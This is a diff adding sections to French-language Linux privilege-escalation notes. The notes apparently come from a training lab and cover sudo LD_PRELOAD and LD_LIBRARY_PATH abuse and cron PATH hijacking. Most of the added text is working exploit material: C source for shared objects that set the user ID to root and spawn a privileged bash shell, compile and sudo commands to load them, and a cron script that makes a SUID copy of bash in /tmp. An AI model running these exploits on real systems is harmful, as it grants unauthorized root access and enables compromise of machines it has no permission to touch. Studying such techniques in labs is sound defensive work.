@@ -96,3 +96,106 @@ chmod +s privEsc
 ```
 ./privEsc
 ```
+<br>
+<br>
+## Sudo - Environment Variables
+
+Quand `sudo -l` si LD_PRELOAD ou LD_LIBRARY_PATH, qui sont des librairies partagées, il est possible de faire un PrivEsc avec 
+
+Créer un objet partagé dans le répertoire `/home/user/tools/sudo/preload.c`
+```
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+```
+```
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+```
+Script `preload.c`
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+
+```
+
+### Apache2 & LD_LIBRARY_PATH
+
+Pour savoir quelles librairies sont utilisées avec apache2
+
+```
+ldd /usr/sbin/apache2
+```
+Créer un objet partagé avec le même nom que un de ceux qui ont été affiché
+
+```
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+
+Lancé apache2 avec sudo 
+
+```
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
+
+Script `library_path.c`
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+<br>
+<br>
+## Cron Jobs - PATH Environment Variable
+
+Exemple
+```
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+```
+
+Checker la variable `PATH` dans /etc/crontab, choper un endroit qui est `writable` par notre utilisateur et y créer un petit script `overwrite.sh` dans `/home/user`
+
+```
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+```
+chmod +x overwrite.sh
+```
+
+puis 
+
+```
+/tmp/rootbash -p
+```
